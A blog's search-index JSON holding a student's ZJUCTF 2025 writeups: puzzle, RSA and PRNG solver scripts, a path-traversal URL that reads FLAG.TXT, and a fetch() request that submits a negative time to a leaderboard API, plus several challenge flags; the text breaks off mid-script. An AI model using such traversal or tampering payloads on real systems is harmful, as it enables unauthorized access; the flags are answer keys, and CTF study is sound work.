{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"introduce","text":"<p>\u8fd9\u91cc\u662fcarry\u7684blog\uff0c\u6211\u662f\u4e00\u540d23\u7ea7iser</p>"},{"location":"#_1","title":"\u672c\u535a\u5ba2\u4f5c\u7528","text":"<p>\u672c\u535a\u5ba2\u4e3b\u8981\u8bb0\u5f55\u4e00\u4e9b\u8bfe\u7a0b\u7b14\u8bb0\uff0c\u4f5c\u4e1a\u4ee5\u53cactf\u6bd4\u8d5b\u7684writeup</p>"},{"location":"#_2","title":"\u5e0c\u671b\u5927\u5bb6\u5728\u8fd9\u91cc\u73a9\u7684\u5f00\u5fc3","text":""},{"location":"ZJUCTF2025/","title":"writeup","text":"<p>\u8bf4\u5728\u524d\u9762</p> <p></p> <p>\u6821\u8d5b\u6700\u96be\u6253\u7684\u4e00\u96c6\uff0c68\u9053\u9898\u76ee\uff0cpwn\u4e5f\u670913\u9053\uff0c\u505a\u4e0d\u52a8\u4e86\uff0c\u5c31\u53ea\u505a\u4e86pwn\u65b9\u5411\u7684\u4e00\u4e9b\u9898\u76ee\uff0c\u5176\u4ed6\u65b9\u5411\u90fd\u662f\u7b7e\u5230\u9898\uff0c\u6700\u540e\u5f97\u5230\u4e86\u4e2apwn\u65b9\u5411\u7b2c\u4e09\uff0c\u4e09\u4e2apwn\u4e00\u8840\u4e00\u4e2apwn\u4e09\u8840</p>"},{"location":"ZJUCTF2025/#misc","title":"misc","text":""},{"location":"ZJUCTF2025/#lab-report","title":"lab report","text":"<p>\u521a\u62ff\u5230\u4ee5\u4e3a\u662f\u7a7a\u767d\u9690\u5199\uff0c\u627e\u4e86\u534a\u5929\u6ca1\u627e\u5230\uff0c\u968f\u540ectrl+A\u53d1\u73b0\u627e\u4e0d\u5230\u7a7a\u767d\uff0c\u8fd8\u627e\u4e86\u534a\u5929\uff0c\u6700\u540e\u53d1\u73b0\u53ea\u8981\u5582\u7ed9AI\u7ed9\u5408\u9002\u7684\u63d0\u793a\u8bcd\u5c31\u53ef\u4ee5\u79d2</p>"},{"location":"ZJUCTF2025/#bingo","title":"bingo","text":"<p>\u633a\u597d\u73a9\u7684\uff0c\u6211\u624b\u63a8\u7684\uff0c\u63a8\u51fa\u6765\u662f\u6b63\u786e\u7b54\u6848\u662f\u7b2c\u56db\u5217\uff0c\u540e\u7eed\u5f04\u4e86\u4e2a\u811a\u672c\u7206\u7834\u9a8c\u8bc1\u4e86\u4e00\u4e0b\uff0c\u786e\u5b9e\u662f\u5bf9\u7684\uff0c\u811a\u672c\u5982\u4e0b <pre><code>import numpy as np\nimport math\nimport itertools\n\n# --- \u8f85\u52a9\u51fd\u6570 ---\n\ndef is_prime(n):\n    if n &lt; 2: return False\n    for i in range(2, int(math.sqrt(n)) + 1):\n        if n % i == 0: return False\n    return True\n\ndef is_composite(n):\n    if n &lt; 4: return False\n    return not is_prime(n)\n\n# --- \u6838\u5fc3\u9a8c\u8bc1\u903b\u8f91 ---\n\nclass PuzzleVerifier:\n    def __init__(self):\n        self.conditions = [\n            [self.cond_00, self.cond_01, self.cond_02, self.cond_03, self.cond_04],\n            [self.cond_10, self.cond_11, self.cond_12, self.cond_13, self.cond_14],\n            [self.cond_20, self.cond_21, self.cond_22, self.cond_23, self.cond_24],\n            [self.cond_30, self.cond_31, self.cond_32, self.cond_33, self.cond_34],\n            [self.cond_40, self.cond_41, self.cond_42, self.cond_43, self.cond_44],\n        ]\n\n    # --- \u6761\u4ef6\u51fd\u6570\u5b9a\u4e49 (0-based \u7d22\u5f15) ---\n    # \u7b2c 1 \u884c\n    def cond_00(self, g, a_s): return g[0, 0] == 1 and is_prime(np.sum(g))\n    def cond_01(self, g, a_s): return np.sum(g) &gt;= 12\n    def cond_02(self, g, a_s): return np.sum(g[:, 1]) &lt;= np.sum(g[:, 2]) and np.sum(g[:, 1]) % 2 == np.sum(g[:, 2]) % 2\n    def cond_03(self, g, a_s): return np.sum(g[0, :]) &lt; np.sum(g[:, 3])\n    def cond_04(self, g, a_s): return any(np.sum(g, axis=1) == 5)\n\n    # \u7b2c 2 \u884c\n    def cond_10(self, g, a_s): return g[1, 0] == 1\n    def cond_11(self, g, a_s):\n        odd_rows = sum(1 for r in range(5) if np.sum(g[r, :]) % 2 != 0)\n        return (np.sum(g) &lt;= 13) != (odd_rows &gt;= 2)\n    def cond_12(self, g, a_s): return sum(1 for r in range(5) if np.sum(g[r, :]) == 0) == 1\n    def cond_13(self, g, a_s): return not is_prime(1) # \u6052\u4e3a True\n    def cond_14(self, g, a_s):\n        for r in range(4):\n            for c in range(4):\n                if np.sum(g[r:r+2, c:c+2]) == 4: return True\n        return False\n\n    # \u7b2c 3 \u884c\n    def cond_20(self, g, a_s): # \u4e2d\u5fc3\u683c\u4e3a 1\uff0c\u4e14\u4e24\u6761\u5bf9\u89d2\u7ebf\u4e0a\u7684 1 \u6570\u4e3a\u5408\u6570\n        if g[2, 2] == 0: return False\n        total_diag_ones = np.trace(g) + np.trace(np.fliplr(g)) - g[2, 2]\n        return is_composite(total_diag_ones)\n    def cond_21(self, g, a_s): # \u5de6\u4e0a 3\u00d73 \u533a\u57df\u81f3\u5c11 5 \u4e2a\u4e3a 1\n        return np.sum(g[0:3, 0:3]) &gt;= 5\n    def cond_22(self, g, a_s): # \u4e0a\u4e0b\u76f8\u90bb\u5747\u4e3a1\u7684\u683c\u5bf9\u4e0d\u5c11\u4e8e\u56db\u5bf9\n        # \u6f84\u6e05\uff1a\u8fd9\u662f\u5168\u5c40\u8ba1\u6570\uff0c\u8ba1\u7b97\u6709\u591a\u5c11\u5bf9 g[r,c]\u548cg[r+1,c] \u5747\u4e3a1\u3002\n        pairs = sum(1 for r in range(4) for c in range(5) if g[r, c] == 1 and g[r+1, c] == 1)\n        return pairs &gt;= 4\n    def cond_23(self, g, a_s): # \u4e0a\u4e0b\u76f8\u90bb\u5747\u4e3a1\u7684\u683c\u5bf9\u4e0d\u591a\u4e8e\u516d\u5bf9\n        # \u6f84\u6e05\uff1a\u540c\u4e0a\uff0c\u8fd9\u662f\u5168\u5c40\u8ba1\u6570\u3002\n        pairs = sum(1 for r in range(4) for c in range(5) if g[r, c] == 1 and g[r+1, c] == 1)\n        return pairs &lt;= 6\n    def cond_24(self, g, a_s): # \u7b54\u6848\u4e0d\u662f\u5bf9\u89d2\u7ebf\n        return a_s['type'] not in ['diag', 'anti_diag']\n\n    # \u7b2c 4 \u884c\n    def cond_30(self, g, a_s): # \u6b64\u683c\u76f8\u90bb\u4e09\u683c\u7684\u52fe\u6570\u4e3a\u5076\u6570\n        return (g[3, 1] + g[2, 0] + g[4, 0]) % 2 == 0\n    def cond_31(self, g, a_s):\n        a = np.sum(g[3, :]); b = np.sum(g[:, 1])\n        return (a*a + b) % 5 &lt;= 3 and a &lt;= b\n    def cond_32(self, g, a_s): # \u5168\u4f53\u52fe\u7684\u91cd\u5fc3\u4e0d\u504f\u53f3\n        total_ticks = np.sum(g)\n        if total_ticks == 0: return True\n        weighted_sum = sum(c * g[r, c] for r in range(5) for c in range(5))\n        return (weighted_sum / total_ticks) &lt;= 2.0\n    def cond_33(self, g, a_s): # \u6b64\u884c\u4e0d\u662f\u6b63\u786e\u7b54\u6848\n        return not (a_s['type'] == 'row' and a_s['index'] == 3)\n\n    # !!!!!!!!!!!!!!!!  \u5df2\u5e94\u7528\u5173\u952e\u903b\u8f91\u4fee\u6b63 !!!!!!!!!!!!!!!!\n    def cond_34(self, g, a_s): # \u5982\u679c\u6ca1\u6709...\u6b64\u9898\u4e0d\u53ef\u89e3\n        # \u65b0\u903b\u8f91\uff1a\u6211\u4eec\u7684\u66b4\u529b\u65b9\u6cd5\u6ca1\u6709\u201c\u903b\u8f91\u8d77\u70b9\u201d\uff0c\u56e0\u6b64\u524d\u63d0\u4e3a\u771f\u3002\n        # \u6211\u4eec\u5047\u8bbe\u6b64\u9898\u53ef\u89e3\uff0c\u56e0\u6b64\u7ed3\u8bba\u201c\u4e0d\u53ef\u89e3\u201d\u4e3a\u5047\u3002\n        # \u6240\u4ee5 \"IF \u771f THEN \u5047\" -&gt; \u6574\u4e2a\u9648\u8ff0\u4e3a False\u3002\n        return False\n    # !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n    # \u7b2c 5 \u884c\n    def cond_40(self, g, a_s): return is_composite(np.sum(g[:, 3]) + np.sum(g[:, 1]))\n    def cond_41(self, g, a_s): # 1 \u4e0d\u662f\u5408\u6570 XOR \u6b64\u5217\u662f\u6b63\u786e\u7b54\u6848\n        return True != (a_s['type'] == 'col' and a_s['index'] == 1)\n    def cond_42(self, g, a_s): # \u6b64\u5217\u662f\u52fe\u6570\u552f\u4e00\u6700\u5c11\u7684\u5217\n        col_sums = np.sum(g, axis=0)\n        return all(col_sums[2] &lt; s for i, s in enumerate(col_sums) if i != 2)\n    def cond_43(self, g, a_s):\n        row_has_3 = any(\"111\" in \"\".join(map(str, g[r, :])) for r in range(5))\n        col_has_3 = any(\"111\" in \"\".join(map(str, g[:, c])) for c in range(5))\n        return row_has_3 and col_has_3\n    def cond_44(self, g, a_s):\n        return np.trace(g) &lt; 3 and np.trace(np.fliplr(g)) &lt; 3\n\ndef check_grid_consistency(grid, assumed_solution, verifier):\n    for r in range(5):\n        for c in range(5):\n            if bool(grid[r, c]) != verifier.conditions[r][c](grid, assumed_solution):\n                return False\n    return True\n\ndef count_full_lines(grid):\n    count = sum(1 for r in range(5) if np.all(grid[r, :] == 1))\n    count += sum(1 for c in range(5) if np.all(grid[:, c] == 1))\n    if np.all(np.diag(grid) == 1): count += 1\n    if np.all(np.diag(np.fliplr(grid)) == 1): count += 1\n    return count\n\ndef main():\n    verifier = PuzzleVerifier()\n    possible_solutions = []\n    for i in range(5): possible_solutions.append({'type': 'row', 'index': i, 'name': f'\u7b2c {i+1} \u884c'})\n    for i in range(5): possible_solutions.append({'type': 'col', 'index': i, 'name': f'\u7b2c {i+1} \u5217'})\n    possible_solutions.append({'type': 'diag', 'index': 0, 'name': '\u4e3b\u5bf9\u89d2\u7ebf'})\n    possible_solutions.append({'type': 'anti_diag', 'index': 0, 'name': '\u526f\u5bf9\u89d2\u7ebf'})\n\n    all_coords = list(itertools.product(range(5), range(5)))\n\n    for assumed_solution in possible_solutions:\n        print(f\"\\n{'='*40}\\n[\u5047\u8bbe] \u7b54\u6848\u662f: {assumed_solution['name']}\\n{'='*40}\")\n\n        fixed_coords = set()\n        s_type, s_index = assumed_solution['type'], assumed_solution['index']\n        if s_type == 'row':\n            for c in range(5): fixed_coords.add((s_index, c))\n        elif s_type == 'col':\n            for r in range(5): fixed_coords.add((r, s_index))\n        elif s_type == 'diag':\n            for i in range(5): fixed_coords.add((i, i))\n        elif s_type == 'anti_diag':\n            for i in range(5): fixed_coords.add((i, 4 - i))\n\n        free_coords = [coord for coord in all_coords if coord not in fixed_coords]\n        num_free = len(free_coords)\n        total_combinations = 2**num_free\n\n        for i in range(total_combinations):\n            if i % 200000 == 0 and i &gt; 0:\n                print(f\"  -&gt; \u6b63\u5728\u68c0\u67e5\u7ec4\u5408 {i} / {total_combinations}...\")\n\n            grid = np.zeros((5, 5), dtype=int)\n            for r, c in fixed_coords: grid[r, c] = 1\n\n            binary_string = bin(i)[2:].zfill(num_free)\n            for idx, (r, c) in enumerate(free_coords):\n                grid[r, c] = int(binary_string[idx])\n\n            if check_grid_consistency(grid, assumed_solution, verifier):\n                print(f\"\\n  [\u6210\u529f] \u627e\u5230\u4e00\u4e2a\u903b\u8f91\u81ea\u6d3d\u7684\u68cb\u76d8 (\u7ec4\u5408 #{i})!\")\n                if count_full_lines(grid) == 1:\n                    print(\"-\" * 40)\n                    print(f\"!!! \u627e\u5230\u552f\u4e00\u89e3\uff01\u5047\u8bbe {assumed_solution['name']} \u6210\u7acb !!!\")\n                    print(\"\u6700\u7ec8\u68cb\u76d8\u683c\u5c40:\")\n                    print(grid)\n\n                    flag_parts = [\"\".join(map(str, row)) for row in grid]\n                    flag = \"ZJUCTF{\" + \"_\".join(flag_parts) + \"}\"\n                    print(\"\\n\u63d0\u4ea4\u7684 Flag:\")\n                    print(flag)\n                    print(\"-\" * 40)\n                    return\n\n    print(\"\\n\u904d\u5386\u6240\u6709\u53ef\u80fd\u6027\u540e\uff0c\u672a\u80fd\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u552f\u4e00\u89e3\u3002\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre></p>"},{"location":"ZJUCTF2025/#jgs","title":"JGS","text":"<p>\u56db\u56fd\u519b\u68cb\uff0c\u62ff\u4e86\u4e2a\u4e8c\u8840\uff0c\u597d\u73a9\uff0c\u5c31\u662f\u786c\u63a8\uff0c\u63a8\u7406\u8fc7\u7a0b\u592a\u591a\u4e86\u771f\u5199\u4e0d\u4e0b\uff0c\u5199\u4e2a\u5927\u81f4\u601d\u8def\u5427\uff0c\u9996\u5148\u6839\u636e\u7279\u6b8a\u7684\u79fb\u52a8\u6765\u5224\u65ad\u5de5\u5175\uff0c\u7136\u540e\u4e00\u76f4\u4e0d\u80fd\u52a8\u7684\u5c31\u662f\u5730\u96f7\uff0c\u7136\u540e\u53f8\u4ee4\u78b0\u6b7b\u519b\u68cb\u4f1a\u66b4\u9732\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6765\u5224\u65ad\u53f8\u4ee4\uff0c\u968f\u540e\u4e2d\u95f4\u5c31\u53ef\u4ee5\u770b\u51fa\u67d0\u4e9b\u5e08\u957f\u554a\u4e4b\u7c7b\u7684\uff0c\u7136\u540e\u518d\u5224\u65ad\u70b8\u5f39\u7684\u4f4d\u7f6e\uff0c\u672c\u4eba\u548c\u5bf9\u5bb6\u4ee5\u53ca\u4e0a\u5bb6\u90fd\u6bd4\u8f83\u65b9\u4fbf\u770b\u51fa\u70b8\u5f39\uff0c\u4e0b\u5bb6\u56e0\u4e3a\u6295\u964d\u4e86\u4e0d\u592a\u597d\u5224\u65ad\uff0c\u53ea\u80fd\u6392\u9664\u6cd5\uff0c\u6700\u540e\u4e00\u70b9\u4e00\u70b9\u53bb\u6392\u6765\u5b9a\u5751\u4f4d\uff0c\u4e0b\u9762\u662f\u6211\u5f53\u65f6\u624b\u5199\u63a8\u7684\u8349\u7a3f\uff0c\u6ca1\u6cd5\u5b8c\u6574\u8bb0\u5f55\u4e86</p>"},{"location":"ZJUCTF2025/#crypto","title":"crypto","text":""},{"location":"ZJUCTF2025/#crypt-it","title":"crypt-it","text":"<p>\u7b7e\u5230\u9898\uff0c\u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u811a\u672c\u5982\u4e0b <pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nimport base64\n\n# --- 1. Read the private key from the PEM file ---\ntry:\n    with open(\"private_key.pem\", \"rb\") as key_file:\n        private_key = RSA.import_key(key_file.read())\nexcept FileNotFoundError:\n    print(\"Error: private_key.pem not found. Make sure the private key file is in the same directory.\")\n    exit()\n\n# --- 2. Read the encrypted message ---\n# The message might be raw binary or Base64 encoded.\n# This script will try to handle both.\ntry:\n    with open(\"flag.enc\", \"rb\") as encrypted_file:\n        encrypted_message = encrypted_file.read()\nexcept FileNotFoundError:\n    print(\"Error: encrypted_message.bin not found. Make sure the encrypted message file is in the same directory.\")\n    exit()\n\n# --- 3. Decrypt the message using RSA with OAEP padding ---\n# Create a cipher object using the private key\ncipher_rsa = PKCS1_OAEP.new(private_key)\n\n# It's common in CTFs for the ciphertext to be Base64 encoded.\n# We'll try to decode it first. If that fails, we'll assume it's raw binary.\ntry:\n    # First, try decoding from Base64\n    encrypted_message_decoded = base64.b64decode(encrypted_message)\n    decrypted_message = cipher_rsa.decrypt(encrypted_message_decoded)\n    print(\"Successfully decrypted after Base64 decoding.\")\nexcept (ValueError, TypeError):\n    # If Base64 decoding fails, assume it's raw binary\n    print(\"Could not decode as Base64. Attempting raw decryption.\")\n    try:\n        decrypted_message = cipher_rsa.decrypt(encrypted_message)\n        print(\"Successfully decrypted raw binary message.\")\n    except ValueError as e:\n        print(f\"Decryption failed. Error: {e}\")\n        print(\"This could be due to a wrong key, corrupted data, or incorrect padding scheme.\")\n        exit()\n\n# --- 4. Print the decrypted flag/message ---\n# The result is in bytes, so we decode it to a string to print it\ntry:\n    flag = decrypted_message.decode('utf-8')\n    print(\"\\n----------- DECRYPTED MESSAGE -----------\")\n    print(flag)\n    print(\"---------------------------------------\")\nexcept UnicodeDecodeError:\n    print(\"\\n----------- DECRYPTED MESSAGE (RAW BYTES) -----------\")\n    print(decrypted_message)\n    print(\"-----------------------------------------------------\")\n    print(\"Note: The output could not be decoded as UTF-8. It is displayed above as raw bytes.\")\n    #ZJUCTF{RSA_encrypt_with_OAEP_is_secure!}\n</code></pre></p>"},{"location":"ZJUCTF2025/#prng-study-plus-1","title":"prng study plus 1","text":"<p>\u968f\u673a\u6570\u9884\u6d4b\uff0c\u6ca1\u770b\u61c2\u548b\u505a\u7684\uff0c\u603b\u4e4bAI\u6765N\u628a\u68ad\uff0c\u725b\u903c\uff0cAI\u7ed9\u6211\u751f\u6210\u7684\u811a\u672c\u5982\u4e0b <pre><code>import hashlib\nimport string\nimport itertools\nfrom pwn import *\nimport math\n\n# --- \u8fde\u63a5\u4fe1\u606f ---\nHOST, PORT = \"127.0.0.1\", 52655\n\n# \u89e3\u51b3\u5de5\u4f5c\u91cf\u8bc1\u660e\ndef solve_pow(challenge_suffix, target_hash):\n    print(f\"[*] \u6b63\u5728\u89e3\u51b3 PoW...\")\n    alphabet = string.ascii_letters + string.digits\n    for p in itertools.product(alphabet, repeat=4):\n        prefix = \"\".join(p)\n        if hashlib.sha256((prefix + challenge_suffix).encode()).hexdigest() == target_hash:\n            print(f\"[+] PoW \u627e\u5230\u89e3: {prefix}\")\n            return prefix\n    return None\n\ndef solve():\n    context.log_level = 'info'\n    try:\n        conn = remote(HOST, PORT)\n\n        # 1. \u89e3\u51b3 PoW\n        conn.recvuntil(b'sha256(XXXX + ')\n        suffix = conn.recv(16).decode()\n        conn.recvuntil(b') == ')\n        target_hash = conn.recv(64).decode()\n        pow_solution = solve_pow(suffix, target_hash)\n        if not pow_solution:\n            log.error(\"PoW \u65e0\u89e3\")\n            return\n        conn.sendlineafter(b'Give me XXXX:', pow_solution.encode())\n\n        # 2. \u83b7\u53d6\u6cc4\u9732\u7684\u6570\u5b57\n        conn.sendlineafter(b'Level: ', b'1')\n        conn.recvuntil(b'[')\n        leaked_str = conn.recvuntil(b']', drop=True).decode()\n        o = [int(x) for x in leaked_str.split(', ')]\n        log.info(f\"\u6cc4\u9732\u7684\u6570\u5b57: {o}\")\n\n        # 3. \u6062\u590d\u53c2\u6570 (\u6700\u7ec8\u9c81\u68d2\u7248)\n        # \u7406\u8bba\u4e0aPRNG\u4e3a\u4e8c\u9636\uff0c\u6211\u4eec\u5c06\u7528\u6240\u6709\u6570\u636e\u70b9\u6765\u6062\u590dp\n        log.info(\"\u575a\u4fe1\u6a21\u578b\u4e3a\u4e8c\u9636\uff0c\u4f7f\u7528\u6240\u6709\u6570\u636e\u70b9\u6062\u590dp...\")\n\n        # o_{n+2} = C1*o_{n+1} + C0*o_n\n        # \u6211\u4eec\u53ef\u4ee5\u5efa\u7acb4\u4e2a\u65b9\u7a0b:\n        # eq0: o_2 = C1*o_1 + C0*o_0\n        # eq1: o_3 = C1*o_2 + C0*o_1\n        # eq2: o_4 = C1*o_3 + C0*o_2\n        # eq3: o_5 = C1*o_4 + C0*o_3\n\n        # \u4ece\u4efb\u610f\u4e24\u4e2a\u65b9\u7a0b\u5bf9\u4e2d\u6d88\u53bbC0\u548cC1\uff0c\u90fd\u80fd\u5f97\u5230\u4e00\u4e2ap\u7684\u500d\u6570\n        # (o_i*o_{j+1} - o_{i+1}*o_j)*C1 = o_{i+2}*o_j - o_{i+1}*o_{i+1}\n        # (o_i*o_{j+1} - o_{i+1}*o_j)*C0 = o_{i+1}*o_{j+2} - o_{i+2}*o_{j+1}\n\n        # \u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u975e\u96f6\u7684p\u7684\u500d\u6570\u6765\u6c42gcd\n        p_multiples = []\n        for i in range(3):\n            for j in range(i + 1, 4):\n                # \u89e3\u65b9\u7a0b\u7ec4:\n                # o_{i+2} = C1*o_{i+1} + C0*o_i\n                # o_{j+2} = C1*o_{j+1} + C0*o_j\n\n                # \u4f7f\u7528\u514b\u83b1\u59c6\u6cd5\u5219\n                D = o[i+1]*o[j] - o[i]*o[j+1]\n                if D == 0: continue\n\n                N1 = o[i+2]*o[j] - o[i]*o[j+2]\n                N0 = o[i+1]*o[j+2] - o[i+2]*o[j+1]\n\n                # D*C1 = N1 (mod p), D*C0 = N0 (mod p)\n                # \u5c06\u5176\u4ee3\u5165\u53e6\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u65b9\u7a0b k\n                for k in range(4):\n                    if k == i or k == j: continue\n                    # \u9a8c\u8bc1: D*o_{k+2} = N1*o_{k+1} + N0*o_k (mod p)\n                    val = D*o[k+2] - (N1*o[k+1] + N0*o[k])\n                    if val != 0:\n                        p_multiples.append(abs(val))\n\n        if len(p_multiples) &lt; 2:\n            log.error(\"\u65e0\u6cd5\u627e\u5230\u8db3\u591f\u7684p\u7684\u500d\u6570\uff0c\u9898\u76ee\u53ef\u80fd\u5b58\u5728\u5176\u4ed6\u9677\u9631\")\n            return\n\n        p = p_multiples[0]\n        for i in range(1, len(p_multiples)):\n            p = math.gcd(p, p_multiples[i])\n\n        log.success(f\"\u6062\u590d\u51fa\u7d20\u6570 p: {p}\")\n\n        # 4. \u6c42\u89e3\u4e8c\u9636\u7cfb\u6570\n        # \u4f7f\u7528\u6700\u65e9\u7684\u4e24\u4e2a\u65b9\u7a0b\n        det = o[1]*o[1] - o[0]*o[2]\n        det_inv = pow(det, -1, p)\n        C1 = (det_inv * (o[2]*o[1] - o[3]*o[0])) % p\n        C0 = (det_inv * (o[1]*o[3] - o[2]*o[2])) % p\n        log.success(f\"\u7cfb\u6570: C1={C1}, C0={C0}\")\n\n        # 5. \u9884\u6d4b\u5b8c\u6574\u5e8f\u5217\n        output = list(o)\n        while len(output) &lt; 20:\n            next_val = (C1 * output[-1] + C0 * output[-2]) % p\n            output.append(next_val)\n        log.info(\"\u9884\u6d4b\u7684\u5b8c\u6574\u5e8f\u5217\u5df2\u751f\u6210\")\n\n        # 6. \u63d0\u4ea4\u7b54\u6848\n        for i in range(20):\n            conn.sendlineafter(b'guess: ', str(output[i]).encode())\n            log.info(f\"Sent guess {i+1}/{20}\")\n\n        final_response = conn.recvall(timeout=2)\n        log.success(f\"\u6210\u529f! \u670d\u52a1\u5668\u54cd\u5e94: \\n{final_response.decode()}\")\n\n    except Exception as e:\n        log.error(f\"\u811a\u672c\u6267\u884c\u51fa\u9519: {e}\")\n    finally:\n        if 'conn' in locals() and conn.connected():\n            conn.close()\n\nif __name__ == \"__main__\":\n    solve()\n#ZJUCTF{Qu@terni0n_1$_jvs7_mA7rIx}\n</code></pre></p>"},{"location":"ZJUCTF2025/#web","title":"web","text":""},{"location":"ZJUCTF2025/#_1","title":"\u4e00\u89c9\u9192\u6765\u5168\u4e16\u754c\u8ba1\u7b97\u80fd\u529b\u4e0b\u964d\u4e00\u4e07\u500d","text":"<p>\u5728\u8c03\u8bd5\u53f0\u91cc\u9762\u7528complate\u4ec0\u4e48\u4ec0\u4e48\u7684\uff0c\u53eb\u4ec0\u4e48\u5fd8\u4e86\u7528\u6765\u5b8c\u6210\u6bd4\u8d5b\u7684\uff0c\u8fd9\u6837\u53ef\u4ee50.00\u79d2\u5b8c\u6210\uff0c\u4f46\u662f\u8fd8\u662f\u4e0d\u5982AAA\u6302\u54e5\u5feb\uff0c\u6211\u52d2\u4e2a\uff0c\u770b\u6765\u53ea\u80fd\u7ed9\u4ed6\u8d1f\u6570\u7684\u65f6\u95f4\u4e86\uff0c\u4e8e\u662f\u7528\u4f20api\u7684\u65b9\u5f0f\u4f20\u4e00\u4e2a\u8d1f\u6570\u7684\u65f6\u95f4\u4e0a\u53bb\uff0c\u811a\u672c\u5982\u4e0b <pre><code>fetch('/api/submit', {\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({\n        username: \"111\",  // &lt;-- \u628a\u8fd9\u91cc\u6362\u6210\u4f60\u7684\u540d\u5b57\n        elapsed_time: -1         // &lt;-- \u6211\u4eec\u5c06\u65f6\u95f4\u8bbe\u7f6e\u4e3a\u8d1f\u6570\n    })\n}).then(response =&gt; response.json()).then(data =&gt; {\n    console.log(\"\u670d\u52a1\u5668\u54cd\u5e94:\", data);\n    // \u63d0\u4ea4\u540e\u53ef\u4ee5\u624b\u52a8\u5237\u65b0\u4e00\u4e0b\u6392\u884c\u699c\n    // location.reload(); \n});\n</code></pre></p>"},{"location":"ZJUCTF2025/#linux","title":"\u4f60\u8bf4\u4f60\u4e0d\u61c2 Linux","text":"<p>AI\u795e\u529b\uff0c\u628ahtml\u53d1\u7ed9AI\uff0cAIN\u628a\u68ad\uff0c\u6700\u540e\u544a\u8bc9\u6211\u8bbf\u95ee\u8fd9\u4e2a <pre><code>http://127.0.0.1:65358/index.php?file=../../a.log/../FLAG.TXT.\n</code></pre> \u5c31\u53ef\u4ee5\u7ed5\u8fc7</p>"},{"location":"ZJUCTF2025/#rev","title":"rev","text":""},{"location":"ZJUCTF2025/#hello-reverse","title":"hello-reverse","text":"<p>\u5f02\u67b6\u6784\uff0c\u60f3\u7740\u7b7e\u5230\u9898\u4e0d\u4f1a\u8fd9\u4e48\u96be\uff0c\u4e8e\u662f\u76f4\u63a5shitf+F12\u627e\u5b57\u7b26\u4e32\uff0c\u5b9a\u4f4d\u5230\u5173\u952e\u5730\u65b9\uff0c\u679c\u7136\u662f\u660e\u6587\u5b58\u50a8\uff0c\u4f46\u662f\u53d1\u73b0tmd\u4e00\u76f4\u90fd\u4ea4\u4e0d\u5bf9\uff0c\u8fd8\u6709\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u540e\u7eed\u53d1\u73b0\u662femoji\uff0cIDA\u7684\u63d0\u53d6\u7684\u65f6\u5019\u81ea\u52a8\u628a\u5c0f\u7aef\u5e8f\u6539\u4e86\u56de\u6765\uff0c\u4f46\u662femoji\u4e0d\u80fd\u6539\u7aef\u5e8f\uff0c\u5bfc\u81f4\u51fa\u4e86\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u6362\u6210\u53e6\u4e00\u4e2a\u7aef\u5e8f\u6253\u5f00\u5c31\u597d\u4e86\uff0c\u662f\u4e2a\u5587\u53ed\u7684emoji</p>"},{"location":"ZJUCTF2025/#hej","title":"hej","text":"<p>java\uff0c\u7528 jadx-jui\u6253\u5f00\u957f\u8fd9\u6837\uff0c\u662f\u4e2a\u5173\u4e8e\u65f6\u95f4\u505aseed\uff0c\u7136\u540e\u7528seed\u751f\u6210\u968f\u673a\u6570\u4e4b\u540e\u4e0eflag\u5f02\u6216\uff0c\u8fd9\u4e2a\u5229\u7528\u5df2\u77e5flag\u524d\u7f00\u4e3a<code>ZJUCTF{</code>\u6765\u8fdb\u884c\u5f02\u6216\uff0c\u9a8c\u8bc1\u79cd\u5b50\u5bf9\u4e0d\u5bf9\uff0c\u7136\u540e\u6839\u636e\u63d0\u793a\uff0c\u65f6\u95f4\u6233\u662f\u5728\u6bd4\u8d5b\u671f\u95f4\u7684\uff0c\u7206\u7834\u4e00\u4e0b\u5c31\u597d\u4e86,\u4e3a\u4e86\u9002\u914d\uff0c\u7528java\u5199\u7684\uff0c\u8ba9AI\u7ed9\u6211\u5199\u7684 <pre><code>import java.nio.charset.StandardCharsets;\nimport java.util.Calendar;\nimport java.util.Date;\nimport java.util.Random;\nimport java.util.TimeZone;\n\n// \u811a\u672c B: \u4f7f\u7528 Unix \u65f6\u95f4\u6233 (\u79d2) \u4f5c\u4e3a\u79cd\u5b50\npublic class ZJUCTF2025Solver {\n\n    public static void main(String[] args) {\n        String targetString = \"r\u00b65\\u0082\\u000fb1\u00f4\u00b4\u00f2+\\u0006\u00bb\\u0095k\u00ae\u00b4Tn\u00db*\\u009d\u00d8g\u00fa\u00fe&gt;c2\u00e9\u00b40G\\u0013\u00e1\u00ca\u00fa\u00c1|\\u001c)\\u001e\u00ee\u00e53\u00a4\\b\u00de\u00fe\u00e7\\n_\\u008a\\u0010\u00f3\u00ed\u00c9\\u0013\u00c1\u00e7\u00f1b7Q\";\n        byte[] targetBytes = targetString.getBytes(StandardCharsets.ISO_8859_1);\n\n        Calendar cal = Calendar.getInstance(TimeZone.getTimeZone(\"UTC\"));\n        cal.set(2025, Calendar.NOVEMBER, 17, 0, 0, 0);\n        cal.set(Calendar.MILLISECOND, 0);\n        // \u540c\u6837\uff0c\u63d0\u524d16\u5c0f\u65f6\u4ee5\u9632\u65f6\u533a\u95ee\u9898\n        cal.add(Calendar.HOUR_OF_DAY, -16);\n        long startTimeMillis = cal.getTimeInMillis();\n\n        cal.add(Calendar.HOUR_OF_DAY, 16); // \u52a0\u56de\u6765\n        cal.add(Calendar.DAY_OF_YEAR, 10);\n        long endTimeMillis = cal.getTimeInMillis();\n\n        // === \u5173\u952e\u4fee\u6539\uff1a\u5c06\u6beb\u79d2\u65f6\u95f4\u6233\u8f6c\u6362\u4e3a\u79d2\u7ea7\u65f6\u95f4\u6233 ===\n        long startTimeSec = startTimeMillis / 1000;\n        long endTimeSec = endTimeMillis / 1000;\n\n        